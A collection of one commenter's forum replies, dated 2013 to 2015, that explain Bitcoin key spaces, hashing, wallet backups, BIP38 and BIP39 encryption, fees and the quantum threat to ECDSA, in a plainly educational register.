Apparently Mycelium is showing some strange behaviour (duplicate transactions and incorrect balance) but eventually fixes itself (maybe helped along by hitting the refresh button).

If you assume relatively even distribution of the 2^96 keys per address across the 256-bit space, chances are you're going to find one of them in 2^160 operations. There may be some statistical outliers where all of the keys are at one end of the keyspace, but that's unlikely unless SHA2 and RIPEMD are bad hashing algorithms. It's still a 160-bit problem *on average*, 256-bit worst case.

Ah right. They must be talking about collisions due to the Birthday paradox. 128-bit strength means the average number of hashes you would need to find a single collision where you have no say over which hashes will collide. So for SHA256, if you hash 2^128 values you will likely find two that have the same hash. 
This kind of attack isn't useful against most of the things SHA256 is used for. It's only useful if the attacker is in control of the message being hashed.
Finding a collision on a specific hash (aka pre-image resistance) is still a ~256-bit problem, barring any flaws in SHA2.

It's only as secure as your "seed". How are you creating that? If it's from your head: don't. Humans are a bad source of entropy. Use dice or something else guaranteed to be actually random. You would need 99 rolls of a 6-sided dice for 256-bit entropy.
It's also only as safe as how you secure the USB drives. Assuming you're not encrypting anything, if someone finds one or you plug one into a compromised computer they could be gone in a flash. To protect against this you'd need to encrypt the keys, or use something like BIP38 or BIP39 mnemonic with a password.


Yes generally. Address reuse is bad practice for several reasons, but sometimes simplicity overrules it. In the past I would try to avoid it by generating multiple offline keypairs, but that doesn't scale well. 
I've recently moved to BIP39 with a password, and I save the master public key/xpub so I can generate unlimited addresses. But I don't think the wallet support is quite there yet for this to be a good choice for a beginner user. A lot of HD wallets do their own thing and the seed isn't portable between them. I'm hoping in a few years this will be the standard because it's better in pretty much every way.

This doesn't sound like a problem with bitcoinpaperwallet.com. It looks like a problem with SSL on your Android device. Which version of Android are you running? Is your time/date correct?

Yes, that's about as safe as it's going to get. If it was a self-signed certificate, you'd get a [big fuckoff browser warning]( that's pretty much impossible to ignore. But some people don't know what they're doing and ignore it somehow.


Note if you literally typed this, without the https:// prefix, then a man-in-the-middle could intercept this and either 1) not redirect to https, or 2) redirect to https but on a domain that looks similar. You wouldn't get any SSL warnings because they'd have a valid certificate for the fake domain.
In this particular case, localbitcoins.com is on the list of sites for the HTTPS Everywhere addon, so your browser will always use https no matter what you type. But in general, it's best to enter the full URL, or triple check that it successfully redirects to https on the correct domain.

Most wallets, including Core, allow you to spend unconfirmed change from previous transactions. If you build a chain of transactions on top of the transaction that "loses", the whole chain becomes invalid.
The way that most wallets handle this is pretty confusing. Last time I used Core, the transactions hung around in a "conflicted" state, and only went away if you run with the -zapwallettxes option. I don't know if that's improved recently.
Today I was using Electrum and several unconfirmed transactions I'd made just plain disappeared without any kind of notification.
So while it's not dangerous and you're not going to lose anything, it can definitely be confusing and disruptive.

Symmetric encryption like AES is only weakened e.g. AES-256 becomes AES-128, so we just need to increase the key size for those.
A large enough quantum computer breaks current asymmetric/public key crypto (ECDSA, RSA etc). Actual public key encryption is rarely used because it's slow, mostly we use it for signing and for exchanging keys which are then used with symmetric encryption. 
There are several quantum-resistant alternatives but they're still proving themselves currently. They generally have much larger key sizes e.g. Lamport signatures use keys around 16kb. Supersingular Elliptic Curve Isogeny Cryptography (basically Elliptic Curve Crypto on steroids) looks promising and if it pans out it could be a drop-in replacement for everything we currently do with ECC and it has reasonable key sizes (3072 bits).

I think it's still early days for the analysis. I've seen other articles mention addresses outside these 3 e.g. 
@_date: 2015-10-04 00:56:34
You need a look-ahead window of addresses to monitor. e.g. monitor the first 50 addresses, then when you find a transaction at an address, extend the window so you're still looking 50 addresses ahead. How far you need to look ahead depends how many orders you get and how many go unpaid.
Most wallets use relatively small gap limits (5 for Electrum I think, 20 for BIP44 wallets) that might not be suitable for merchants, but you can usually change it to whatever you need.
You could also use an algorithm to recycle addresses that were never used - expire them after a certain period. But this step probably isn't necessary unless you end up with thousands of unused addresses.

xprv to mnemonic is not possible because it goes through a one-way function.
What you have is the xprv for the 0-th account, so the correct derivation path would be m/0/i for receiving addresses and m/1/i for change addresses.

This isn't related to RSA, it's the Diffie-Hellman key exchange. 
The majority of implementations use a known prime as a starting point (or a small subset of primes). The NSA has (maybe) pre-computed all the discrete logs for those few primes in the 1024-bit keyspace, effectively creating a rainbow table. 
If you generate your own DH params instead of relying on the defaults, even 1024-bit would be safe because the NSA can't pre-compute for all possible primes, just a few common ones. But this is an additional step that most servers don't implement, and can sometimes be difficult to configure.
Moving to 2048-bit DH is also secure because pre-computing for any prime in a 2048-bit keyspace is not feasible.

Quantum computers aren't magical machines, they're only really good at a subset of problems.
Current understanding is that hashing and symmetric encryption like AES are merely weakened instead of completely broken in a post-quantum world. Effective key strength is halved (see Grover's Algorithm) so AES/SHA-256 becomes 128-bit secure, which is still safe from brute forcing.

Privacy is the main concern when it comes to address reuse, and providing an xpub has no benefit in this regard because you can generate all possible addresses from it anyway. Also there's no wallet support or protocol for sending to an xpub, knowing which address to use next etc.
Any theoretical security issue with address reuse also applies to HD wallets if the xpub is known.
The proper solution is [payment codes]( or stealth addresses, neither of which are finalised or have any real wallet support.
For now the best option would be a single address that you change from time to time.

It was kind of an informal standard in the earlier days of Bitcoin and used on multiple sites/tools, so it stayed that way for backwards compatibility reasons I guess. Even now bitaddress defaults to uncompressed for brain wallets. Compressed keys only really became the norm around 2014 despite being supported by Bitcoin Core long before then.
Thankfully it shouldn't matter much since it's (hopefully) a dying standard that people realise is insecure unless you really know what you're doing, and there are better options now.

The part you might be missing is that everyone is working on a different puzzle. The block that each miner is working on will be slightly different due to several reasons.
1. Which transactions they've chosen to include, and in what order
2. Block timestamp
3. The coinbase/reward transaction (1st tx in the block) will be different because each miner will be sending it to their own unique address. 
All of these differences (plus others I haven't mentioned) will lead to a completely different block header and so a different puzzle to solve.

When you say you "made a measly amount", do you mean you mined them? Or just collected from faucets or other freebies? Did you use the standard Bitcoin client? Did you uninstall it?
If you get to the point where you've given up and consider them lost, I'd be happy to remote in using teamviewer/remote desktop or whatever for one last try.

Sweeping means sending the entire balance to a new address contained in the wallet you're sweeping it to. It's not merely importing.
In the new world of HD wallets, importing is somewhat dangerous because the imported key won't be covered by the wallet seed and backups become more complicated.

If you're talking about typos, this is extremely unlikely to happen. The last four letters in an address are a checksum, so if you make even the slightest typo it is no longer a valid address and can't be sent to.
If you mean sending to a valid address where the owner no longer has the private key, then what you're saying is true .. with emphasis on *astronomically* small since the numbers involved truly are astronomical in scale.

This is true only because vanitygen (and I hope all similar tools if any exist) starts searching from a random seed. If the starting point was a known value then two searches of the same prefix would generate the same key every time. For this reason it's important that you trust the tool you're using. From memory there was once a dodgy GUI frontend to vanitygen that generated addresses in a deterministic way.

BTW These odds are based on starting with an address and trying to guess a matching private key. If you're attacking it from the other end the calcs are different i.e. randomly picking private keys attempting to find an address that has funds on it, will depend how many addresses you're trying to match.against. But given the relatively small number of addresses currently used it would be a similar order of magnitude.

I work with a largish company involved in the tourism industry. The number of intermediaries the cash needs to go through for a typical tour package is ridiculous. And for each step, someone (usually VISA/MC) takes a cut. Then there's currency conversion costs added on top. It's so wasteful!
Every day I think "this would be so much easier if we could use BTC". The CEO is surprisingly open to Bitcoin, and considering offering it as a payment option "at some point", but on the B2B side there's no chance of that any time soon. Visa/MC is so ingrained in the industry, it's pretty much impossible to operate without it. They offer perks like travel insurance, frequent flyer miles .. it will be a tough market to crack.

Addresses are used as the output of a standard transaction, i.e. it's where the value is "sent" to. Transaction outputs are somewhat flexible and can even contain scripts, so it may well be possible to send directly to the pub key, but this kind of transaction would need to be hand crafted.
Reasons for using addresses instead of raw pub keys:
* they are much smaller since they are basically a hash of the key. Larger transactions take up more space on the blockchain and tx fees are also based on tx size
* they contain a checksum to prevent typos or data corruption. Using just a pub key, if you flip a bit it's still a valid destination. With an address it would fail the checksum
* they are base58 encoded which removes characters that look the same 0OIl to prevent typos

localbitcoins is pretty safe if you choose a seller with a good rating and use their escrow service (pretty sure that happens by default). They act as middle-man and won't release the Bitcoin until both parties have signed off on the transaction.

An address' "balance" is the total of all (unspent) transaction outputs it has received. So if an address has received many transactions, its balance will be made up of many smaller amounts. It's these smaller amounts (unspent outputs) that become the inputs of any outgoing transaction, and they must be spent in full. If an address has only ever received one transaction, then the total amount will be spent, otherwise it's possible that only some of the unspent outputs are included in the transaction.

If you've ever manually imported a private key, it won't be covered by the seed phrase so you'll need to backup the wallet in that case.

For the qt client and a lot of others, yes.
Some clients/wallets will return change back to the sending address, or at least give an option to. Mycelium (Android wallet) does this if you use the paper wallet import, and blockchain.info lets you do it via Custom Send.

This has nothing to do with double spending. It's just Coinbase creating a new transaction sending the amount back to the address it came from. The problem is if you're using a shared wallet like inputs.io or many other online wallets, that address isn't necessarily "owned" by you.

What you're saying is true for apps. An app only has root access if you grant it. But I think he's talking about the ROM you install in order to root your phone. If the operating system itself was dodgy then you're screwed. But it would be extremely unlikely unless you used some obscure ROM or downloaded a popular one from an untrusted source.
@_date: 2013-10-24 08:17:22
1: You probably don't *need* to, but it's recommended.  bitcoin-qt pre-generates and stores (without showing them to you) the next 100 addresses that it will use in your wallet (100 by default). When you use a new address, it will pull it from this pool. So if you've backed up your wallet.dat relatively recently, the new address should already be contained in your backup.
2: Personally I would use encryption on the wallet also. Using folder encryption doesn't protect you if the attacker has somehow logged into your system or is a trojan, or if the file is accidentally moved/copied to an unencrypted folder.
3: Transfer all your funds to a new address immediately, using a computer you know isn't compromised.
4: If you used AES as the encryption type (should be the default I think) then it is just as secure as TrueCrypt or similar methods. 25 characters is a decent length but how complicated is it? The length doesn't matter much if it's something dumb like abcdefgh... , a common phrase or something easy to guess.

It uses AES-256 which is industry standard and as secure as Truecrypt or any similar tool assuming it's a good password.
However the addresses/public keys are not encrypted, so if someone finds your wallet.dat they can easily work out your balance which is obviously a privacy concern. It would also help an attacker to decide whether it's worth even attempting to bruteforce it.

Some banks are actively trying to stop it. Here in Aus, our biggest exchange was dumped by a major bank without notice or any real reason. Who's to say their new bank won't do the same in the future.
So that's an example where a bank has directly interfered with Bitcoin transactions. Indirectly, I'm sure they're also lobbying govt to introduce laws that make trading Bitcoin more difficult or impossible in the future.

No nothing is ever backed up to the server, that would defeat the purpose of using it. The seed itself contains everything you need to regenerate your wallet completely offline. The server is only needed so it can check the 'balance' of each address so it knows when to stop regenerating address/private keys. It stops when it finds a chain of addresses that haven't yet been used.

That would be [ECC]( (Elliptic Curve Cryptography) using the [Secp256k1]( curve. SHA256 has nothing to do with public key derivation.




No clue where these numbers come from. Private keys are 256-bit so there are 2^256 of them. Addresses, due to the use of RIPEMD-160 are limited to 2^160 possible values.


For each address, there are actually many possible priv/pub keypairs. Like 2^96 many. 2^256-160

By brainwallet, he's talking about where you start with a phrase and SHA-256 hash it to create a private key from it. The problem is creating a phrase that is sufficiently random (it's hard/impossible for a human to do that).
The other kind of brainwallet that people use is the seed phrase for deterministic wallets like Electrum. These are effectively the reverse: a random seed key is generated, then it is encoded into a 12-word mnemonic. These are random enough and generally considered "safe".

@_date: 2013-11-05 07:53:06
Basically. A brain wallet is starting with a string that you want to remember and using SHA256 to turn that into a private key (which is essentially a string of random characters).
If you're just going to use a long random string that you're never going to remember, you may as well skip the SHA256 step and just use the private key directly. This is what a standard paper wallet is e.g. paper wallet tab at bitaddress.org,  etc

I would not do this. At all. If your server is only ever receiving funds, there's no reason for it to know the private keys. You can store them offline.
The simplest solution would be to pre-generate a whole bunch of keys/addresses, and only store the addresses on the server. Obviously you'd need to top them up occasionally if you're getting close to using them all.
The better solution would be to use a deterministic wallet. In the same way that a single seed key can generate all the private keys ever used in a wallet, you can use the public key version of the seed to generate addresses only and never have to worry about exposing the private keys. Both Electrum and Armory can operate in this way - when creating a new wallet just enter the master public key instead of the normal seed.
[BIP32]( is the future of deterministic address/key generation, but there are no major clients that support it yet. There are some libraries available but nothing in PHP that I'm aware of.

bitcoin-qt will enforce a fee of 0.0001 BTC per kilobyte even if you try to set it to zero.
You could try importing your address/wallet into a blockchain.info account and send the balance via *custom send* which allows you to set the miner's fee. I'd suggest putting at least 0.0001 but you could try zero. There's no guarantee the transaction will be confirmed, but it will probably happen eventually.

I mentioned in my post but I don't know if it was clear...  You say you'll be putting the donations to use straight away, so I guess that means you'll be converting them to $US to pay your providers/suppliers? Because it's unlikely they accept Bitcoin (not yet anyway). You can setup both coinbase and bitpay to automatically cashout to your bank account in $US every day. Using this option you don't need to worry about wallets and backups at all, you just get the $US value of your donations each day into your bank.
I think you can also set up a split e.g. keep x% as Bitcoin, y% to bank account.

localbitcoins acts as an escrow service, like a middleman to broker the deal. You're not trading directly person-to-person. Before the trade starts, the seller has to fund their wallet on localbitcoins with the amount. You send payment to the seller and they mark it as complete when they receive it. The Bitcoins are released from the seller's wallet into your wallet on localbitcoins. It's then up to you to decide what you do with them e.g. transfer to a local wallet on your computer or an online wallet like coinbase or blockchain.info
If the seller says they haven't received the amount, then a dispute is raised and localbitcoins will step in to resolve it asking for proof of payment (receipts etc) and probably ID.
If you buy from a seller with a good rating you're unlikely to have any problems.

Mining is all about hashing, and there's no known quantum vulnerability that would allow SHA256 to be "cracked".
The threat of quantum computing is that, given a public key you are able to calculate its private key much faster. Still not instantly, but with a large enough quantum computer it could theoretically bring bruteforcing a private key into the realm of possibilities instead of being unfathomable unlikely.
But even that would only make addresses that have previously been spent from vulnerable. An address is the public key hashed using SHA256 and RIPEMD160, and since hashing is safe, there's no way to crack a private key just from the address. But addresses that have previously been spent from have had their public keys published to the blockchain, so these would be vulnerable to quantum attacks and any remaining funds could be spent if the key was cracked. This is one reason for not reusing addresses (another is privacy).
If it does become a threat, it is unlikely to be a sudden development so it can be planned for by switching ECDSA crypto for something that's quantum safe.

It's in Armory and Multibit. Electrum only via command line I think. It's a pretty cumbersome solution in my opinion, and has other problems. e.g. if the sender is using a shared wallet (Coinbase, Mt Gox) then they don't control the address that the funds come from, they don't have the private key and hence can't sign with it.

Ah, sorry. Seems my reading comprehension has been hampered by lack of sleep &gt;&lt; I missed the part about needing to make payouts.
Encrypting the data like you said would be a start. It sounds like you're writing a plugin that would have many installations, so storing the password in the code means that anyone that uses your plugin knows the password for everyone else. You'd want the password to be installation-specific, maybe loaded from a properties file or at least make the user set their own password in the code. Consider using scrypt to reduce the likelihood of bruteforce attacks.
The only more secure options I can think of is to use a hardware keystore, or require manual entry of the password on server startup, but I'm guessing both of those would be unworkable for you.

Not really. The supply of new Bitcoins isn't related to computational complexity. It's simply a time-based formula. Every 210,000 blocks or ~4 years, the reward is halved. It's independent of the hash rate. It's a cap because towards the end, the amount get so small that the next time it halves it will be zero (rounded down).

I don't think you were foolish. BIP38 is a great idea for keeping your paper wallet safe from prying eyes.
The problem though is that BIP38 is pretty new and not widely supported yet. About the only place you can directly import it so far is in a blockchain.info wallet (web version, not the app yet).
But you can decrypt your key on bitaddress.org. Just enter it on the wallet tab. It will ask for the password and then will show you the actual decrypted private key that you can then import into just about any wallet.
@_date: 2013-11-30 14:13:11
While that's true for bitcoin-qt, Multibit generally only has one address and it sends change back to the same address. Unless you explicitly tell it to generate more addresses. It's like blockchain.info in that way.

Wow a good idea, and with code to boot. Nice work :)
Not to rain on your parade, but similar ideas have been suggested in the past but it has never taken off. Electrum even implemented something like it that used Bitcoin message signing rather than PKI/SSL
I agree it is much simpler compared to BIP0070/0072 but I'm not sure what you mean when you say it's usable offline. Don't you need to be online to check the certificate? I guess if you've previously dealt with the merchant you could already have their cert cached .. is that what you mean?

Depends entirely how long the logs are kept, and also how clever your theoretical thief is. They might play the long con and wait until you've transferred a substantial amount to the wallets before swiping it all in one surprise hit.

So start at the point where a Bitcoin is mined. The owner of it stores it at address A. They want to spend 0.6 BTC to someone that owns address B. They'd make a transaction saying *send 0.6 BTC to address C, and return the change (0.4) to me*. Address A now has 0.4 BTC, address B has 0.6 and the coin has now effectively been split.
In reality, most wallets wouldn't send the change back to A, but instead to a brand new address known as a change address (for privacy reasons). But I'm trying to keep it simple.
@_date: 2013-11-02 19:21:25

    A transaction may be safely sent without fees if these conditions are met:
    It is smaller than 10,000 bytes.
    All outputs are 0.01 BTC or larger.
    Its priority is large enough (see the Technical Info section below) 
Your transaction met those criteria, so I'm not sure why it wasn't included in the next block. It has one confirmation now so all is good I guess!

Nice work. The only thing probably worth mentioning is that blockchain.info isn't a typical web wallet in that they don't know your private keys. Yes they store them for you, but they are encrypted and decrypted in your browser, and never touch their server in unencrypted form. So it's a bit of a hybrid wallet in that sense.
Obviously there's still some trust involved. You need to trust they don't change their code or get compromised in a way that breaks that model.
@_date: 2013-10-28 16:28:30
The whole point of doing the offline part is that the private key should never be present in unencrypted form on the Windows PC **ever**. You don't know for sure if it is clean. So by opening the PDF and printing it on your Windows machine, you've defeated the whole purpose of the liveCD/offline bit. You could have a trojan recording your screen, among other possibilities. So you should definitely print from your offline install if possible, or just write it down if you don't want a fancy looking paper wallet with qr codes.
Ideally you should do the Truecrypting and printing from the offline PC.

If you buy 2 BTC and there is at least 2 BTC listed at 1250, then that's what you'll get. But if there's less than 2 BTC available at that rate, it will do as you say and match against higher sells until the order is complete.
That's if you buy at the market rate. If you specify the price you want, it will only match against that number (or lower) and will sit on the books until a match is found or you cancel.
@_date: 2013-12-11 07:42:22
Ok, I guess we agree there. I thought perhaps there was some flaw or recent criticism that I'd missed.
It's definitely early days for scrypt. I think it was born in 2009 by one person. There was an IEEE draft standard drawn up, but that expired.
The way Litecoin has used it is definitely flawed. Using only 128kb as the memory param was incredibly short-sighted and is why GPU mining became viable so quickly. Even using standard bcrypt would have provided better protection.
I don't know how well this would work in practice, but I always figured if the Litecoin devs were smart they would have somehow incorporated the scrypt parameters into the difficulty calculation. So as the hash rate increases, the scrypt params get higher and higher, requiring more RAM and more iterations. This would probably rule out ASICs as well as I'm guessing they would be optimised for a particular set of scrypt params, and if the params changed the ASIC would become effectively useless. Hmm ... did I just invent a new altcoin? It seems too obvious, so it probably already exists.
@_date: 2013-10-01 16:52:35
Were the addresses/keys generated by the wallet clients, or did you generate them yourself using something like a brainwallet and then import? Just trying to rule out some possibilities ...
@_date: 2013-11-24 08:54:47
RIPEMD-160 was used because it produces a shorter hash output but still 2^160 of entropy is more than enough for any foreseeable future. 
Address generation uses both RIPEMD and SHA256 so that if either were found to have vulnerabilities it wouldn't matter much. It's unlikely that both will be compromised at the same time. Using a double hash also prevents certain types of theoretical attacks. It could have used double SHA, but then you're 100% reliant on SHA.

Block size doesn't greatly affect mining though. The hashing you're describing only occurs once at the very start of the process to calculate the block hash. Mining then involves hashing the shit out of the block hash and an incrementing nonce.

History basically. There have been several high-profile (at the time) wallets and exchanges that have been hacked and forced to shut down. People have lost a lot of BTC that way. Others have simply disappeared taking peoples' BTC with them (mainly in the early days).
Things are getting better all the time, we're all learning from the mistakes of others. Coinbase is a serious company with investors so unlikely to run off with your money. You'd hope they put a lot of money and effort into security, but nothing is truly 100% secure.

@_date: 2013-11-24 06:09:05
I was also thinking of that. In a future where Bitcoin is less obscure, it's a possibility, similar to forcing victims to reveal their card PIN now. 
One option would be for wallet software to have a separate honeypot account that only has a small amount in there. Give the attacker the fake PIN and they only get access to the decoy account. But then I guess the mugger could just force you to reveal the real PIN if they thought you were bluffing. And so begins the arms race ... Better just to only ever keep a small amount I guess.

Based on the the pattern of transactions, it's probably an address owned by a shared wallet service or exchange like Mt Gox or Coinbase. It has a large turnover, but never holds much balance at any point in time. All incoming transactions are sent off to other addresses soon after they're received. Exactly what you'd expect for a shared wallet.

Yes that would be OK right now because blockchain.info by default sends change back to the same address, but that's not how most wallets work and it's not guaranteed to stay that way at blockchain.info either.

Unless you have other wallets with similar passwords (if so move them NOW), the damage is done so why not reveal it? 
@_date: 2013-10-27 17:57:26


Yep. It will give you a big ol' warning about this if you try to import. It's a bit painful, and spending from the imported address can be a bit tricky. You need to enable Expert Mode, then you can right-click the address and choose Prioritize. The next spend you make should take the funds from this address. It's pretty clunky.
Instead of "polluting" your Electrum wallet with imported keys, people usually import the paper/brain wallet into a different client (bitcoin-qt, blockchain.info) and send the balance to an Electrum address.


Yes each private key corresponds to a single address. When you export you'll get all the keypairs contained in the wallet. bitcoin-qt always maintains a pool of 100 address/pairs (by default) so immediately your wallet will contain 100 addresses even before making any transactions. Your wallet balance is just the sum of all the addresses. Electrum also generates in advance, including some change addresses that you can only see in Expert Mode.
@_date: 2013-10-27 18:30:48
Not currently possible in Electrum via the UI unfortunately. Might be available in the future though.

Your Bitcoin "balance" isn't stored in your wallet, it is stored on the blockchain that is verified and distributed around the entire network. It's a ledger of verified transactions that every node agrees on.
You wallet contains addresses and their keys that allow you to send transactions to the network in a way that verifies you actually "own" those addresses. Because the network as a whole verifies if the transaction is valid, it can detect duplicate transactions and decline them. It's a bit of a simplified explanation, but that's the basic idea.
You can make as many copies of your wallet as you want, but all you're copying is a list of addresses and their private keys. In fact, you *should* be copying your wallet so you have a backup (keeping in mind it should be stored safely preferably with strong password encryption)

Say there's an unspent output with value of 0.0001337 BTC. In the blockchain, it is stored as satoshis so it will be 13370
Later we decide that we need 10 decimal places. To preserve the value of that output it would need to be rewritten as 1337000. But we can't modify the blockchain, the amount forms part of the signature which can only be generated with the private key. So the only solution would be to somehow treat all amounts after the changeover differently to those before it. e.g. if transaction block number is less than &lt;changeover&gt;, we need to treat the value as a satoshi. If it's after, we treat them as deci-satoshi (or whatever the new unit would be called). 
It's a change to the protocol and would require everyone to upgrade at the same time otherwise a fork would occur. But obviously we'd be able to plan for it well in advance (assuming it ever becomes an issue).

1 confirmation is different to being only seen by 1 peer. Your problem is that your transaction hasn't been sent out through the network at all for some reason. I'm not a big Multibit user, but I've heard it sometimes gets "stuck" and you need to reset the blockchain to force it to sync (Tools menu from memory)

Minimum fees are currently hard-coded into the clients, so they tend to get unreasonably large when there are large increases in the BTC price and only adjust when there's a new software release.

It's always a good idea to test your backups so you can be confident you're able to restore if it ever becomes necessary. You should be able to do it without creating new users and Electrum installs though. Just create a new wallet and switch between them. In the latest Electrum you can do that from menu, otherwise just rename electrum.dat to electrum.dat.bak or something and the next time it starts it will prompt for the seed or wallet file.

SHA256 isn't encryption, it's a hashing algorithm. Bitcoin's public/private keypairs use Elliptic Curve crypto, but still there's no encryption here, just digital signing (ECDSA).

I think that depends on the individual. If I were a complete Bitcoin noob I probably wouldn't feel comfortable using it until it was implemented by at least one major wallet.
But as a software dev and Bitcoin nerd, I understand how it works and I know where I can find the algorithm if I ever need to decode it myself, in the unlikely scenario where bitaddress.org and similar sites drop off the face of the earth.
Although it is technically still a draft, the algorithm is well-defined and already in use by Casascius coins and others.
You could always keep a copy of bitaddress.org yourself as a failsafe.

1. Hard to say or quantify really. It uses scrypt which is a very CPU and memory intensive algorithm, so bruteforcing the password is much harder compared to e.g. brain wallets. You can get away with shorter passwords, but still the longer the better and the usual password quality rules apply (no common phrases etc). A comparison with estimated cracking costs for various schemes (from 2012). BIP38 would be somewhere between the scrypt 64m and 3.8s rows. You can see it gets exponentially harder the longer the password is: 
2. Not yet a part of the standard bitcoin-qt client or any other major wallet. It's currently limited to the bitaddress.org site itself and blockchain.info AFAIK. BIP38 keys start with a 6 instead of a 5, so they are easily identified.
3. Coinbase doesn't support it yet
4. There's currently no way to do this directly on the bitaddress.org site, but see this post for a hack that lets you encrypt an existing key. I don't recommend it though: 
@_date: 2013-12-04 12:36:24


That might be the case for external threats, but it's likely that everything on the internal network is closely monitored and possibly logged. LOG EVERYTHING is a common policy for some companies.
I have worked at a company that kept a copy of all print jobs for x weeks. If you printed to a network printer, it's possible it was logged, or even that the printer stored your print job - large network printers usually have some form of persistent storage.
You could use BIP38 encryption to password-protect your paper wallets, and it would be safe from these threats assuming the password is decent.
Personally I'd feel much safer printing on my own computer instead of one controlled by a third party.

No nothing to do with ECC. There's still a 1-to-1 mapping between private and public keys. Addresses however are a hash of the public key using both SHA-256 and RIPEMD-160, so effectively the public keys are 'shortened' to the smallest hash size (160 bits).
I don't know of any hard proof of the distribution, but even distribution is an important requirement of secure hash functions. SHA2 and RIPEMD are both highly regarded and highly used algorithms so I'm guessing the distribution is good.

When you're using an online wallet, the details of your private keys/addresses are usually hidden from you. You have a balance of X amount of BTC, but that balance could be spread across any number of addresses that the company manages in a pool. They just keep track of your total balance, but how it is stored is up to them.
@_date: 2013-11-21 08:46:21
So this second transaction, how do you know it happened? Is it showing in your transaction history and your Coinbase balance?
If you're looking at the addresses on blockchain.info then that means nothing since Coinbase is a shared wallet.
@_date: 2013-12-09 00:51:48
All private keys start with either 5J, 5K or 5H. It's normal, nothing to worry about.
@_date: 2013-10-21 16:56:25
First off, the numbers you'll be working with are enormous. Private keys are 256 bits (up to ~76 digits in base10). Public keys are 520 bits (154 digits). Far outside the capabilities of a normal calculator. The algorithms involve many iterations of very complex binary calculations: xor, shift, rotate .. things also not really possible on a basic calculator.
Assume you're starting with a suitable random and complex passphrase (aka brainwallet). Pick words from books or dictionary or something. To create a 256 bit private key, you'd start by [SHA-256]( hashing the phrase.
To create a public key from this private key, you'd need to know the [ECDSA algorithm]( which is some [incredibly complicated]( maths. This would be the hardest part. Like probably millions of steps hard.
Once you have the pub key, generating the Bitcoin address involves multiple iterations of [SHA-256]( and [RIPEMD-160]( followed by [base58]( encoding (relatively easy) to get the final string.

Generating addresses is trivial and completely safe to do offline without even checking if it is already used. That's how many possible addresses there are. Your wallet (whether it's a desktop/mobile or a web wallet) takes care of tracking them all for you. Generally it's recommended to use a fresh address for every transaction. When you're spending, most clients will generate an address each time to send the change to for example. Mainly for privacy reasons.

The parts about the firewall all sound ok.
Password generated by LastPass is good. If you're confident your system has no malware now or in the future (keyloggers etc) then you are pretty safe so far.


Which password are you talking about here? If it's the LastPass password, you would also need to store a copy of the wallet file in your safe or somewhere else. That password is useless on its own.
There is a seed that Armory can use to restore your entire wallet. You should have had an option to print this when you first created your wallet, or you can print it at any time from Wallet Properties &gt; Make paper backup. If you don't want to print you can write down the root key and chain key. With this kind of paper backup you don't need a copy of the wallet file at all. If you're doing it by hand I would definitely do a test import of your paper backup to make sure you've written it correctly.

Number of addresses: 2^160
Number of [Mega Millions]( combos: 258,890,850
Odds of winning x times is 258,890,850^x. How many times do I need to win to approach the same odds as 2^160?
    258,890,850^x = 2^160   solve for x
    ln(258,890,850^x) = ln(2^160)
    x*ln(258,890,850) = ln(2^160)
    x = ln(2^160) / ln(258,890,850) = 5.72
So somewhere between 5 and 6 times. Change the numbers if that lottery figure doesn't match the lottery odds in your area.

Personally, I see the checksum as being pretty useful. It allows you to easily verify you've written/recorded the private key correctly even when offline. Though I guess you could achieve this without the checksum if you verified the address derived from the raw key is what you expect.
I'm not sure what kind of errors you're trying to cater for? I'm guessing physical copies, so smudged or faded printouts maybe. If a digital copy is corrupted it's likely that you wouldn't even be able to extract a valid string from it. I think I'd rather true redundancy by having multiple backups in different locations.
I was interested to know how many redundant bytes you'd need to add to the key to get any meaningful error correction. I ran some tests using Reed-Solomon error correction (same as used for QR codes) and it seems for every N bytes you add, it allows N/2 bad bytes. So using a 4-byte ECC (same size as WIF checksum) it allows 2 bad characters in any random position in the key.
Sample output below just messing up the first bytes instead of random (easier to see)

It does have that benefit, but it's unknown if it was intentional or just a bonus side effect.  
If you follow the recommended practice of never re-using addresses, then your funds are effectively safe against known quantum attacks. ECC, SHA2 and RIPEMD would all need to be compromised at the same time (pretty much impossible).
If you re-use addresses and ever make a partial spend from an address then its public key is published in the blockchain and that address now has no protection from SHA/RIPEMD.
EC public keys are 512 bits in standard form, so it's possible the hashing was mainly used as a shortener. 512-bit addresses would be very long and take up more space in the blockchain. Although you can use compressed keys which drops the size to ~256 bits.

@_date: 2013-11-16 21:41:33
OK, a confusion with terminology then. I think you're talking about *addresses*. A wallet contains many addresses. The terms aren't interchangeable.
In any case, I don't recommend using LBC as a wallet. It's possible, but it's really only meant for holding your funds temporarily while you're buying and selling. I would recommend transferring your balance to a blockchain.info wallet if you want an online wallet, or to your own Electrum wallet if you want to manage it yourself.

It's still "safe" in that your data sent to/from the site will still be encrypted. But the issuer of the certificate is saying that they no longer vouch for it.

Pruning is being looked into, it's a planned feature. No prediction has failed, because the condition to decide that has not yet occurred. It will definitely be needed in the future, but right now it's a nice-to-have.

Nooooo. Floating point should never be used for currency (or anything that requires exactness). It's not possible to represent all numbers as floating point and you end up with nasty rounding errors.
In code, Bitcoin uses 64-bit integers to represent values which leaves a fair bit of room for expansion, but the main problem is the way amounts are represented in the blockchain. They are stored as satoshis, so a transaction of 1 BTC is represented as 100000000 in the blockchain. If we just added more decimal places this would mean any existing amounts in the blockchain would be decreased in value by how ever many orders of magnitude was added. The solution would probably involve a decision to handle amounts differently after block x when the switch occurs, but still honour the existing method for blocks before that. It would be a fork since anyone that didn't upgrade in time would be dealing with the blockchain in an incompatible way.
@_date: 2013-11-23 00:30:13
That will never happen, the blockchain is not designed to store large amounts of arbitrary data. Imagine the bloat! When you're talking about millions/billions of transactions, every byte counts.
You could maybe store a hash of your logs to prove existence and non-tampering of your logs.
Also look into BitMessage

Got a summary? Paywalled.
@_date: 2013-11-25 05:13:31
Yep! There are two main types of BIP38 encryption. One where you start off with a known private key (like in my hack) and encrypt it with a password. The second is where the 'real' key is generated randomly as part of the process and never exists anywhere in its unencrypted form (until you choose to decrypt it). The algorithm is slightly different since they have different starting points, so the first few characters are used to identify which method was used.
6 means a private key that needs something else to be usable. Different schemes in the future will also likely start with 6.
6P means it's BIP38.
6PR is BIP38 of an existing uncompressed private key.
6PY is BIP38 of an existing compressed private key.
6Pf is BIP38 of a random key.
There are a few other possible prefixes but you get the point.
@_date: 2013-10-30 14:38:57
Just expanding on answer for 3
